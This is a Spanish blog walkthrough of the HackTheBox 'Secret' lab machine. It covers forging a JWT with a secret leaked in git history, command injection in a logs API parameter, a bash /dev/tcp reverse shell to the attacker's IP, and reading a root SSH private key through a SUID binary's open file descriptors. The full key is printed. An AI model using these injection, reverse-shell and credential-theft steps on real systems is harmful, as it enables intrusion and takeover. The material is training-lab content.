---
layout: single
title: Secret HTB - WriteUp
excerpt: WriteUp de la máquina Secret de HTB.
date: 2023-03-05
classes: wide
header:
  teaser: /assets/images/Secret/Secret.png
  teaser_home_page: true
  icon: /assets/images/Secret/Secret.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup
  - Web-Enumeration
  - API
  - JWT                                                                                                                                                                                   
  - GIT
  - RCE
  - SUID
---

En el día de hoy estaremos resolviendo la máquina Secret de HackTheBox. Es una máquina Linux y su dirección IP es 10.10.11.120.

### Índice

1. [Enumeración Inicial](#enumeración-inicial)
2. [Web Enum](#web-enum)
3. [Git Enumeration](#git-enumeration)
4. [Code Analysis](#code-analysis)
5. [Web Explotation](#web-explotation)
6. [File Descriptors Privesc](#file-descriptors-privesc)

### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.

```bash
❯ nmap -sC -sV -Pn -oN Extraction -p22,80,3000 10.10.11.120
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-05 11:48 CET
Nmap scan report for 10.10.11.120
Host is up (0.056s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


### Web Enum

Podemos ver el servicio SSH y dos servidores web, uno en el puerto 80 y el otro en el puerto 3000. Ambas tienen el mismo conetido, la documentación de una API. La cual no enseña a crear usuarios, iniciar sesión con ellos y comprobar si somos administradores. Vamos a crear un usuario.

```bash
❯ curl -X POST "http://10.10.11.120/api/user/register" -H 'Content-Type: application/json' -d '{"name":"bertranuco","email":"bly@bly.com","password":"Testing123"}'
```

La respuesta es:

```json
{"user":"bertranuco"}
```

Ahora vamos a probar iniciar sesión con el usuario que hemos creado.

```bash
❯ curl -X POST "http://10.10.11.120/api/user/login" -H 'Content-Type: application/json' -d '{"email":"bly@bly.com","password":"Testing123"}';echo
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDA0NzY1Y2JhNDliMTA0NjU4ZTEwOWUiLCJuYW1lIjoiYmVydHJhbnVjbyIsImVtYWlsIjoiYmx5QGJseS5jb20iLCJpYXQiOjE2NzgwMTQxNjZ9.GXkbKwu2A-hLv6TiYfyNW_oA3cYkbzz_c_PfaYiGNuE
```

Al autenticarnos podemos se nos proporciona un token JWT que decodeado muestra la siguiente información.

![](/assets/images/Secret/img1.png)

### Git Enumeration

El JWT utliza el algoritmo HS256 por lo que si queremos crear nuestro propio token, nos hará falta conocer el secreto con el que se firma el JWT. Si volvemos a la web podemos ver que hay un botón para descargarse el código fuente de la página.

![](/assets/images/Secret/img2.png)

Esto nos descargará un .zip que podemos descomprimi. Si vemos el contenido de la carpeta que hemos extraido, podemos ver que se está haciendo el control del versiones con git. 

```bash
❯ ls -la
drwxrwxr-x root root 182 B  Fri Sep  3 07:57:09 2021  .
drwxr-xr-x root root  36 B  Sun Mar  5 11:49:47 2023  ..
drwxrwxr-x root root 144 B  Sun Mar  5 11:49:57 2023  .git
drwxrwxr-x root root  14 B  Fri Aug 13 06:42:59 2021  model
drwxrwxr-x root root 4.1 KB Fri Aug 13 06:42:59 2021  node_modules
drwxrwxr-x root root  20 B  Fri Sep  3 07:54:52 2021  public
drwxrwxr-x root root  80 B  Fri Sep  3 08:32:00 2021  routes
drwxrwxr-x root root  22 B  Fri Aug 13 06:42:59 2021  src
.rw-rw-r-- root root  72 B  Fri Sep  3 07:59:44 2021  .env
.rw-rw-r-- root root 885 B  Fri Sep  3 07:56:23 2021  index.js
.rw-rw-r-- root root  68 KB Fri Aug 13 06:42:59 2021  package-lock.json
.rw-rw-r-- root root 491 B  Fri Aug 13 06:42:59 2021  package.json
.rw-rw-r-- root root 651 B  Fri Aug 13 06:42:59 2021  validations.js
```

Por lo que podemos acceder a los commits y ver si hay alguno que muestre información sensible.

```bash
❯ git log --oneline
e297a27 (HEAD -> master) now we can view logs from server 😃
67d8da7 removed .env for security reasons
de0a46b added /downloads
4e55472 removed swap
3a367e7 added downloads
55fe756 first commit
```

Podemos ver que hay un commit interesante... "removed .env for security reasons" vamos a mirarlo.

```bash
❯ git show 67d8da7
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secre
```

### Code Analysis

Estamos viendo el secreto del token. Ahora podriamos crear nuestro propio token JWT, vamos a mirar un poco mas el código. Vamos a mirar las rutas de la API.

```bash
❯ ls -la
drwxrwxr-x root root  80 B  Fri Sep  3 08:32:00 2021  .
drwxrwxr-x root root 182 B  Fri Sep  3 07:57:09 2021  ..
.rw-rw-r-- root root 2.1 KB Fri Aug 13 06:42:59 2021  auth.js
.rw-rw-r-- root root 666 B  Fri Aug 13 06:42:59 2021  forgot.js
.rw-rw-r-- root root 1.5 KB Wed Sep  8 20:32:32 2021  private.js
.rw-rw-r-- root root 390 B  Fri Aug 13 06:42:59 2021  verifytoken.js
```

Podemos ver que desde aquí se controlan los endpoints de la API. Vamos a mirar el archivo private.js

```js
router.get('/priv', verifytoken, (req, res) => {                                                                                                                                             
   // res.send(req.user)                                                                                                                                                                     
                                                                                
    const userinfo = { name: req.user }                                                                                                                                                      
                                                                                   
    const name = userinfo.name.name;                                                                                                                                                         
                                                                                
    if (name == 'theadmin'){                                                                                                                                                                 
        res.json({                                                                                                                                                                           
            creds:{                                                                                                                                                                          
                role:"admin",                                                                                                                                                                
                username:"theadmin",                                                                                                                                                         
                desc : "welcome back admin,"                                                                                                                                                 
            }                                                                                                                                                                                
        })                                                                                                                                                                                   
    }
```

En este fragmento de código podemos ver el usuario que vamos a impersonar creando nuestro propio token. Debido a que es el usuario administrador. En el siguiente fragmento de codigo podemos ver una vía potencial de ejecutar comandos a nivel de sistema.

```js
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
     
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
```

Podemos ver que se esta ejecutando de forma directa git, además, podemos pasarle un archivo. Podriamos aprovecharnos de esto... Primero vamos a crear nuestro token.

![](/assets/images/Secret/img3.png)

### Web Explotation

Ahora vamos a probar a acceder a uno de esos endpoints proporcionando el token.

```bash
❯ curl -s -X GET "http://10.10.11.120/api/priv" -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDA0NzY1Y2JhNDliMTA0NjU4ZTEwOWUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImJseUBibHkuY29tIiwiaWF0IjoxNjc4MDE0MTY2fQ.oGmU6qXk2wzj-NbSI-bAoLxszxOUlqpUYkfOnkcVIik' | jq
{
  "creds": {
    "role": "admin",
    "username": "theadmin",
    "desc": "welcome back admin"
  }
}
```

Podemos ver que nos hemos autenticado como administradores. Ahora vamos a intentar aprovecharnos de la función de logs que habiamos visto antes.

```bash
❯ curl -s -X GET "http://10.10.11.120/api/logs?file=test" -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDA0NzY1Y2JhNDliMTA0NjU4ZTEwOWUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImJseUBibHkuY29tIiwiaWF0IjoxNjc4MDE0MTY2fQ.oGmU6qXk2wzj-NbSI-bAoLxszxOUlqpUYkfOnkcVIik' | jq

{
  "killed": false,
  "code": 128,
  "signal": null,
  "cmd": "git log --oneline test"
}
```

Esa sería la forma intencionda, pero si intentamos concatenar comandos vamos a ver lo que sucede.

```bash
❯ curl -s -X GET "http://10.10.11.120/api/logs?file=e;id" -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDA0NzY1Y2JhNDliMTA0NjU4ZTEwOWUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImJseUBibHkuY29tIiwiaWF0IjoxNjc4MDE0MTY2fQ.oGmU6qXk2wzj-NbSI-bAoLxszxOUlqpUYkfOnkcVIik' | jq

"uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```

Vemos que el comando ID se ha ejecutado correctamente, ahora nos intentaremos establecer una revshell.

```bash
❯ curl -s -G "http://10.10.11.120/api/logs" -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDA0NzY1Y2JhNDliMTA0NjU4ZTEwOWUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImJseUBibHkuY29tIiwiaWF0IjoxNjc4MDE0MTY2fQ.oGmU6qXk2wzj-NbSI-bAoLxszxOUlqpUYkfOnkcVIik' --data-urlencode "file=test ;bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'"
```

Si miramos nuestro listener podemos ver que hemos ganado shell.

```bash
❯ nc -lvvp 443
listening on [any] 443 ...
10.10.11.120: inverse host lookup failed: Unknown host
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.120] 59460
bash: cannot set terminal process group (1125): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$
```

Ahora le hacemos el tratamiento de la tty para tener una shell totalmente interactiva. Una vez la tengamos, empezamos a enumerar  para escalar privilegios.


### File Descriptors Privesc

Si enumeramos los privilegios SUID, podemos ver que existe un binario compilado.

```bash
dasith@secret:/home$ find / -user root -perm -4000 -print 2>/dev/null | grep -v "/snap"
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/opt/count
```

Estamos hablado de  /opt/count, si ejecutamos el programa nos pide un archivo del sistema.

```bash
dasith@secret:/home$ /opt/count 
Enter source file/directory name: /etc/shadow

Total characters = 1187
Total words      = 36
Total lines      = 36
Save results a file? [y/N]:
```

```bash
Enter source file/directory name: /root   
-rw-r--r-- .viminfo
drwxr-xr-x ..
-rw-r--r-- .bashrc
drwxr-xr-x .local
drwxr-xr-x snap
lrwxrwxrwx .bash_history
drwx------ .config
drwxr-xr-x .pm2
-rw-r--r-- .profile
drwxr-xr-x .vim
drwx------ .
drwx------ .cache
-r-------- root.txt
drwxr-xr-x .npm
drwx------ .ssh
```

```bash
dasith@secret:/home$ /opt/count 
Enter source file/directory name: /root/.ssh
drwx------ ..
-rw------- authorized_keys
-rw------- id_rsa
drwx------ .
-rw-r--r-- id_rsa.pub
```

Podemos ver esas caracteristicas de cualquier archivo o directorio porque estamos bajo un contexto de root. Además podemos guardar el output en un archivo. 

Podemos aprovecharnos de esto gracias a los descriptores de archivos de la siguiente forma. 

> undescriptor de archivo es un número entero que identifica un archivo abierto por un proceso. Cada proceso tiene su propia tabla de descriptores de archivo, que mantiene un seguimiento de los archivos que el proceso ha abierto y sus atributos, como la posición actual del puntero de lectura/escritura, los permisos de acceso y el modo de apertura.


Si ponemos el programa en suspensión, podemos ver información sobre los archivos que se están abriendo desde "/proc/pid/fd". Para leer el archivo debememos tener permisos, eso quiere decir que del directorio de root solo prodriamos leer.

```bash
-rw-r--r-- .viminfo
drwxr-xr-x ..
-rw-r--r-- .bashrc
lrwxrwxrwx .bash_history
-rw-r--r-- .profile
```

Podemos leer esos archivos, vamos a hacer una prueba. Vamos a leer el .bashrc.

```bash
dasith@secret:~$ /opt/count 
Enter source file/directory name: /root/.bashrc

Total characters = 3106
Total words      = 537
Total lines      = 100
Save results a file? [y/N]: ^Z
[5]+  Stopped                 /opt/count
```

Hemos dejado el proceso en segundo plano, ahora tenemos que saber su identificador.

```bash
dasith@secret:~$ ps aux | grep count
root         824  0.0  0.1 235680  7520 ?        Ssl  10:46   0:00 /usr/lib/accountsservice/accounts-daemon
dasith      1706  0.0  0.0   2488   584 pts/0    T    11:59   0:00 /opt/count
dasith      1708  0.0  0.0   6432   732 pts/0    S+   12:00   0:00 grep --color=auto count
```

El PID del proceso es "1706" ahora podemos acceder a el en la ruta /proc/1706/fd, si vemos listamos los archivos podemos ver enlaces simbolicos.

```bash
dasith@secret:/proc/1706/fd$ ls -al
total 0
dr-x------ 2 dasith dasith  0 Mar  5 12:01 .
dr-xr-xr-x 9 dasith dasith  0 Mar  5 12:00 ..
lrwx------ 1 dasith dasith 64 Mar  5 12:03 0 -> /dev/pts/0
lrwx------ 1 dasith dasith 64 Mar  5 12:03 1 -> /dev/pts/0
lrwx------ 1 dasith dasith 64 Mar  5 12:03 2 -> /dev/pts/0
lr-x------ 1 dasith dasith 64 Mar  5 12:03 3 -> /root/.bashrc
```

Si tratamos de leer 3 podemos ver el contenido de .bashrc.

```bash
dasith@secret:/proc/1706/fd$ cat 3                                                                                                                                                           
# ~/.bashrc: executed by bash(1) for non-login shells.                                                                                                                                       
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)                                                                                                                   
# for examples                                                                                                                                                                               
# If not running interactively, don't do anything                                                                                                                                            
[ -z "$PS1" ] && return                                                                                                                                                                      
                                                                                 
# don't put duplicate lines in the history. See bash(1) for more options                                                                                                                     
# ... or force ignoredups and ignorespace                                                                                                                                                    
HISTCONTROL=ignoredups:ignorespace                                                                                                                                                           
                                                                                
# append to the history file, don't overwrite it                                                                                                                                             
shopt -s histappend                                                                                                                                                                          
                                                                                
# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)                                                                                                                        
HISTSIZE=1000                                                                                                                                                                                
HISTFILESIZE=2000    
[..SNIP..]
```

Veiamos que "otros" pueden leer el archivo .viminfo cabe destacar que este archivo actua como una cache. Puede tener información privilegiada. Vamos a tratar de leerlo como hemos hecho con el archivo anterior.

```bash
dasith@secret:/proc/1679/fd$ ls -la
total 0
dr-x------ 2 dasith dasith  0 Mar  5 11:55 .
dr-xr-xr-x 9 dasith dasith  0 Mar  5 11:55 ..
lrwx------ 1 dasith dasith 64 Mar  5 11:55 0 -> /dev/pts/0
lrwx------ 1 dasith dasith 64 Mar  5 11:55 1 -> /dev/pts/0
lrwx------ 1 dasith dasith 64 Mar  5 11:55 2 -> /dev/pts/0
lr-x------ 1 dasith dasith 64 Mar  5 11:55 3 -> /root/.viminfo
```

Si leemos el archivo podemos  ver el siguiente contenido.

```bash
# Debug Line History (newest to oldest):                                                                                                                                            [479/526]
# Registers:                                                                                                                                                                                 
""0     LINE    0                                                                                                                                                                            
        -----BEGIN OPENSSH PRIVATE KEY-----                                                                                                                                                  
        b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn                                                                                                               
        NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3                                                                                                               
        KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+                                                                                                               
        7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1                                                                                                               
        xw0OmoCdyhvQ3azlbkZZ7EWeTtQ/EYcdYofa8/mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx                                                                                                               
        8G+KbGPcN174a666dRwDFmbrd9nc9E2YGn5aUfMkvbaJoqdHRHGCN1rI78J7rPRaTC8aTu                                                                                                               
        BKexPVVXhBO6+e1htuO31rHMTHABt4+6K4wv7YvmXz3Ax4HIScfopVl7futnEaJPfHBdg2                                                                                                               
        5yXbi8lafKAGQHLZjD9vsyEi5wqoVOYalTXEXZwOrstp3Y93VKx4kGGBqovBKMtlRaic+Y                                                                                                               
        Tv0vTW3fis9d7aMqLpuuFMEHxTQPyor3+/aEHiLLAAAFiMxy1SzMctUsAAAAB3NzaC1yc2                                                                                                               
        EAAAGBAJ+sy5Zu0DhhmcrVAjt0jaUeb3Q38Tc5X5FMOJzMP4RZaUT2ikW4tylGbASsoKDr                                                                                                               
        85oc1mHLONd1AyalDFrPqPTsHqtL4sENUCZlcM76hYxTUsc1xFaI5qAnj8Pu8Da8YrZD65                                                                                                               
        rlYljxkAqLQQwmZp+FjWzU9JHLHwPm+MQfmpurcg7Yao3zyZ4ETn9GdupQNccNDpqAncob                                                                                                               
        0N2s5W5GWexFnk7UPxGHHWKH2vP5m0Pmpjm/WGqlhogWouvcNB839OpQfHMfBvimxj3Dde                                                                                                               
        +GuuunUcAxZm63fZ3PRNmBp+WlHzJL22iaKnR0RxgjdayO/Ce6z0WkwvGk7gSnsT1VV4QT                                                                                                               
        uvntYbbjt9axzExwAbePuiuML+2L5l89wMeByEnH6KVZe37rZxGiT3xwXYNucl24vJWnyg                                                                                                               
        BkBy2Yw/b7MhIucKqFTmGpU1xF2cDq7Lad2Pd1SseJBhgaqLwSjLZUWonPmE79L01t34rP                                                                                                               
        Xe2jKi6brhTBB8U0D8qK9/v2hB4iywAAAAMBAAEAAAGAGkWVDcBX1B8C7eOURXIM6DEUx3                                                                                                               
        t43cw71C1FV08n2D/Z2TXzVDtrL4hdt3srxq5r21yJTXfhd1nSVeZsHPjz5LCA71BCE997                                                                                                               
        44VnRTblCEyhXxOSpWZLA+jed691qJvgZfrQ5iB9yQKd344/+p7K3c5ckZ6MSvyvsrWrEq                                                                                                               
        Hcj2ZrEtQ62/ZTowM0Yy6V3EGsR373eyZUT++5su+CpF1A6GYgAPpdEiY4CIEv3lqgWFC3                                                                                                               
        4uJ/yrRHaVbIIaSOkuBi0h7Is562aoGp7/9Q3j/YUjKBtLvbvbNRxwM+sCWLasbK5xS7Vv                                                                                                               
        D569yMirw2xOibp3nHepmEJnYZKomzqmFsEvA1GbWiPdLCwsX7btbcp0tbjsD5dmAcU4nF                                                                                                               
        JZI1vtYUKoNrmkI5WtvCC8bBvA4BglXPSrrj1pGP9QPVdUVyOc6QKSbfomyefO2HQqne6z                                                                                                               
        y0N8QdAZ3dDzXfBlVfuPpdP8yqUnrVnzpL8U/gc1ljKcSEx262jXKHAG3mTTNKtooZAAAA                                                                                                               
        wQDPMrdvvNWrmiF9CSfTnc5v3TQfEDFCUCmtCEpTIQHhIxpiv+mocHjaPiBRnuKRPDsf81                                                                                                               
        ainyiXYooPZqUT2lBDtIdJbid6G7oLoVbx4xDJ7h4+U70rpMb/tWRBuM51v9ZXAlVUz14o                                                                                                               
        Kt+Rx9peAx7dEfTHNvfdauGJL6k3QyGo+90nQDripDIUPvE0sac1tFLrfvJHYHsYiS7hLM                                                                                                               
        dFu1uEJvusaIbslVQqpAqgX5Ht75rd0BZytTC9Dx3b71YYSdoAAADBANMZ5ELPuRUDb0Gh                                                                                                               
        mXSlMvZVJEvlBISUVNM2YC+6hxh2Mc/0Szh0060qZv9ub3DXCDXMrwR5o6mdKv/kshpaD4                                                                                                               
        Ml+fjgTzmOo/kTaWpKWcHmSrlCiMi1YqWUM6k9OCfr7UTTd7/uqkiYfLdCJGoWkehGGxep                                                                                                               
        lJpUUj34t0PD8eMFnlfV8oomTvruqx0wWp6EmiyT9zjs2vJ3zapp2HWuaSdv7s2aF3gibc                                                                                                               
        z04JxGYCePRKTBy/kth9VFsAJ3eQezpwAAAMEAwaLVktNNw+sG/Erdgt1i9/vttCwVVhw9                                                                                                               
        RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9                                                                                                               
        6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl                                                                                                               
        xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k                                                                                                               
        fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==                                                                                                                                       
        -----END OPENSSH PRIVATE KEY-----
|3,1,0,1,38,0,1633544227,"-----BEGIN OPENSSH PRIVATE KEY-----","b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn","NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkU
w4nMw/hFlpRPaKRbi3","KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+","7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1","xw0OmoCdyhvQ3azlbkZZ7E
WeTtQ/EYcdYofa8/mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx",>72
|<"8G+KbGPcN174a666dRwDFmbrd9nc9E2YGn5aUfMkvbaJoqdHRHGCN1rI78J7rPRaTC8aTu","BKexPVVXhBO6+e1htuO31rHMTHABt4+6K4wv7YvmXz3Ax4HIScfopVl7futnEaJPfHBdg2","5yXbi8lafKAGQHLZjD9vsyEi5wqoVOYalTXEXZwO
rstp3Y93VKx4kGGBqovBKMtlRaic+Y","Tv0vTW3fis9d7aMqLpuuFMEHxTQPyor3+/aEHiLLAAAFiMxy1SzMctUsAAAAB3NzaC1yc2","EAAAGBAJ+sy5Zu0DhhmcrVAjt0jaUeb3Q38Tc5X5FMOJzMP4RZaUT2ikW4tylGbASsoKDr","85oc1mHLON
d1AyalDFrPqPTsHqtL4sENUCZlcM76hYxTUsc1xFaI5qAnj8Pu8Da8YrZD65",>72
|<"rlYljxkAqLQQwmZp+FjWzU9JHLHwPm+MQfmpurcg7Yao3zyZ4ETn9GdupQNccNDpqAncob","0N2s5W5GWexFnk7UPxGHHWKH2vP5m0Pmpjm/WGqlhogWouvcNB839OpQfHMfBvimxj3Dde","+GuuunUcAxZm63fZ3PRNmBp+WlHzJL22iaKnR0Rx
gjdayO/Ce6z0WkwvGk7gSnsT1VV4QT","uvntYbbjt9axzExwAbePuiuML+2L5l89wMeByEnH6KVZe37rZxGiT3xwXYNucl24vJWnyg","BkBy2Yw/b7MhIucKqFTmGpU1xF2cDq7Lad2Pd1SseJBhgaqLwSjLZUWonPmE79L01t34rP","Xe2jKi6brh
TBB8U0D8qK9/v2hB4iywAAAAMBAAEAAAGAGkWVDcBX1B8C7eOURXIM6DEUx3",>72
```

Vemos una clave privada de SSH vamos a copiarla y intentemos conectarnos con ella.

```bash
❯ ssh -i id_rsa2 root@10.10.11.120
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 05 Mar 2023 12:11:32 PM UTC

  System load:           0.0
  Usage of /:            52.7% of 8.79GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             218
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.120
  IPv6 address for eth0: dead:beef::250:56ff:feb9:f144


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct 26 15:13:55 2021
root@secret:~# 
```

Ya hemos pwneado la máquina, espero que te sirva!










